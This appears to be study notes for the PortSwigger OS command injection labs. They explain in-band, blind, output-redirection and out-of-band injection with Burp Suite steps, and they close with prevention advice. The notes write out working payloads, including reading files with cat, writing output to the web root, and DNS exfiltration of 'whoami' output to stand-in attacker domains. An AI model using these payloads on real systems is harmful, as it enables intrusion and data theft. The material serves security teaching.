# OS Command injection

* Also known as shell injection.
* It allows an attacker to execute OS commands on the server running an application.
* It can compromise the application and its data.
* An attacker can leverage OS command injection to compromise other parts of the hosting infrastructure.
* An attacker can exploit trust relationships to pivot to other systems within the organization.

Injecting OS commands

* Example: A shopping application lets the user view whether an item is in stock in a particular store.
* The URL to access this information:

```http
https://insecure-website.com/stockStatus?productID=381&storeID=29
```

* The application must query various legacy systems to provide the stock.
* To achieve this, it uses a shell command to call out the product and store ID as arguments on the system:

```bash
stockreport.pl 381 29
```

* This command outputs the stock status for the specified item, which is returned to the user.
* If the application has no filters against OS command injection, an attacker can submit the input below to execute an arbitrary command:

```bash
& echo givemecheese &
```

* The input is submitted in the productID parameter and executed by the application:

```bash
stockreport.pl & echo givemecheese & 29
```

The `echo` command causes the supplied string to be echoed in the output. This is how we can test for some types of OS command injection. The `&` character is a shell command separator: it causes three separate commands to execute, one after another.

Example output:

```
Error - productID was not provided
givemecheese
29: command not found
```

The three lines of the output demonstrate:

* The original `stockreport.pl` command was executed without its expected argument and so returned an error message.
* The injected `echo` command was executed, and the supplied string was echoed in the output.
* The original argument `29` was executed as a command, which caused the error.

Placing the additional command separator `&` after the injected command is useful: it separates the injected command from whatever follows the injection point. This reduces the chance that what follows will prevent the injected command from executing.

Labs: OS command injection (simple case)

{% stepper %}
{% step %}
### Vulnerability

This lab contains an OS command vulnerability in the product stock checker.
{% endstep %}

{% step %}
### End-goal

Execute the `whoami` command to determine the name of the current user.
{% endstep %}

{% step %}
### Analysis

* The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.
* Use Burp Suite to intercept the request that checks the stock level.
* Click on the check stock and view the history in Burp Suite.
* Send the request to Repeater and test the product parameter with `& echo givemecheese`. A 200 response with the echoed string indicates injection.
* URL-encode the command (e.g., `& whoami` encoded) before sending to the backend.
* The command output is displayed, confirming the vulnerability.
* From the result you can run another command to read files, e.g. `& cat /home/peter-tkbRC6/stockreport.sh` (URL-encode).
* You can add `#` to comment out the rest of the original command if needed (URL-encode).
* Modify the `storeID` parameter to include the injection and send the request; observe the response.
{% endstep %}

{% step %}
### Payload

`& whoami` (URL-encode before sending)
{% endstep %}
{% endstepper %}

Useful commands

* Execute some initial commands to obtain information about the system

| Purpose of command    | Linux       | Windows       |
| --------------------- | ----------- | ------------- |
| Name of current user  | whoami      | whoami        |
| Operating system      | uname -a    | ver           |
| Network configuration | ifconfig    | ipconfig /all |
| Network connections   | netstat -an | netstat -an   |
| Running processes     | ps -ef      | tasklist      |

Blind OS command injection vulnerabilities

* This means the application doesn't return the output from the command within its HTTP response.
* Different techniques are required.
* Example: A website submits feedback to a site administrator. The server-side application calls the mail program with submitted details:

```bash
mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
```

* The output from the `mail` command is not returned in the application's responses. Using `echo` won't work in this situation.
* Other techniques are required to detect and exploit the vulnerability.

Detecting blind OS command injection using time delays

* Inject a command that triggers a time delay, and confirm execution based on how long the response takes.
* The `ping` command is a common choice; you can specify the number of ICMP packets to send to control the duration:

```bash
& ping -c 10 127.0.0.1 &
```

This causes the application to ping its loopback adapter for 10 seconds.

Lab: Blind OS command injection with time delays

{% stepper %}
{% step %}
### Vulnerability

This lab contains an OS command vulnerability in the feedback function.
{% endstep %}

{% step %}
### End-goal

Cause a 10-second delay via blind OS command injection.
{% endstep %}

{% step %}
### Analysis

* Use Burp Suite to intercept the feedback submission request.
* Test parameters with the `sleep` or `ping` payload, e.g. in the name parameter try `& sleep 10` and use `#` to comment out the rest (URL-encode).
* If it doesn't delay, try another parameter.
* If it delays, that's the vulnerable parameter to test further.
* Example encoded payload for the email parameter:

```
email=x||ping+-c+10+127.0.0.1||
```

* Observe the response takes 10 seconds to return.
{% endstep %}

{% step %}
### Payload

`email=x||ping+-c+10+127.0.0.1||` (URL-encode before sending)
{% endstep %}
{% endstepper %}

Exploiting blind OS command injection by redirecting output

* You can redirect the output from the injected command into a file within the web root, then use the browser to retrieve it.
* Example (redirecting output to a file the web server serves):

```bash
& whoami > /var/www/static/whoami.txt &
```

* The `>` character sends the output from `whoami` to the specified file. Then retrieve:

```http
https://vulnerable-website.com/whoami.txt
```

Lab: Blind OS command injection with output redirection

{% stepper %}
{% step %}
### Vulnerability

This lab contains an OS command vulnerability in the feedback function. The application executes a shell command containing user-supplied details; the output is not returned in the response. There is a writable folder at `/var/www/images/`, and images are served from that location.
{% endstep %}

{% step %}
### End-goal

Redirect the output of a command into a file in the web root and retrieve it via the image loading URL.
{% endstep %}

{% step %}
### Analysis

* Confirm which parameter is vulnerable to blind command injection using a sleep payload.
* Identify where images are stored (e.g., `/var/www/images/`).
* Redirect output to a file in that folder.
* Example payload (URL-encode):

```
email=||whoami>/var/www/images/output.txt||
```

* Modify the image filename parameter to request `output.txt` and observe the response containing the injected command output.
{% endstep %}

{% step %}
### Payload

`whoami` (use a redirect to a web-accessible file and URL-encode the entire injection)
{% endstep %}
{% endstepper %}

Exploiting blind OS command injection using out-of-band (OAST) techniques

* Injected commands can trigger out-of-band network interactions to systems you control.
* Example:

```bash
& nslookup givemecheese.web-attacker.com &
```

* This uses `nslookup` to cause a DNS lookup for the specified domain. Monitor your controlled server (or Burp Collaborator) to see if the lookup happens.

Lab: Blind OS command injection with out-of-band interaction

{% stepper %}
{% step %}
### Vulnerability

A blind OS command injection vulnerability in the feedback function.
{% endstep %}

{% step %}
### End-goal

Trigger a DNS lookup to an attacker-controlled domain (e.g., Burp Collaborator).
{% endstep %}

{% step %}
### Analysis

* Use Burp Suite to intercept and modify feedback requests.
* Identify the vulnerable parameter (e.g., Email) via a `sleep` test.
* If local file writes are not possible, trigger an out-of-band interaction with an external domain.
* Example payload (URL-encode appropriately):

```
email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
```

* Use Burp Collaborator (or another OAST service) to monitor for DNS lookups or other interactions.
{% endstep %}

{% step %}
### Payload

Example: `email=x|| nslookup https://eoj6t86j8bh3dvx.m.pipedream.net|| #` (URL-encode before sending)
{% endstep %}
{% endstepper %}

How to exfiltrate command output via DNS

* Out-of-band channels provide an easy way to exfiltrate command output:

```bash
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

* This causes a DNS lookup for a domain that includes the result of `whoami`, allowing the attacker to receive the output in a DNS query (e.g., `www.user.kgji2ohoyw.web-attacker.com`).

Lab: Blind OS command injection with out-of-band data exfiltration

### Vulnerability

A blind OS command injection vulnerability in the feedback function.

### End-goal

Exfiltrate command output via a DNS query to an attacker-controlled domain (e.g., Burp Collaborator).

### Analysis

* Use Burp Suite to intercept and modify feedback requests.
* Identify the vulnerable parameter via a `sleep` test.
* If local writes are not writable, trigger an out-of-band interaction.
* Example pattern:

```
email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
```

* Monitor the out-of-band service for inbound DNS lookups containing the command output.



## Payload

`& nslookup \`whoami\`.kgji2ohoyw.web-attacker.com &\` (URL-encode before sending) \{% endstep %\} \{% endstepper %\}

Ways of injecting OS commands

* There are a number of shell metacharacters that allow commands to be chained. Separators that work both on Windows and Linux:

```
&
&&
|
||
```

* Separators for Unix-based systems:

```
;
Newline (0x0a or \n)
```

* Unix-based systems also use inline execution:

```
`injected command`
$(injected command)
```

* Different shell metacharacters behave subtly differently. Some can be used for in-band retrieval or blind exploitation.
* If the input you control appears within quotation marks in the original command, you need to terminate the quoted context using " or ' before using suitable shell metacharacters to inject a new command.

How to prevent OS command injection

* Never call out OS commands from application-layer code when avoidable.
* Use safer platform APIs.
* If you must call commands, apply strong input validation:
  * Validate against a whitelist of permitted values.
  * Validate that the input is a number when expected.
  * Validate that input contains only allowed characters (e.g., alphanumeric), with no other syntax or whitespace.
* Do not rely on attempting to sanitize input by escaping shell metacharacters; prefer whitelist validation and safe APIs.
